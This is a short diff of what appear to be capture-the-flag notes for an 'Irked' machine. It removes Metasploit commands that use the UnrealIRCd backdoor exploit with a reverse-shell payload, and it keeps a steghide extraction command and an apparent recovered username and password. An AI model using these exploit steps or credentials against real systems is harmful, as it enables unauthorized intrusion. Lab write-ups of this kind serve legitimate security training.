@@ -1,6 +1,3 @@
-msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
-msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
-
 steghide extract -sf irked.jpg
 
 djmardov:Kab6h+m+bbp2J:HG
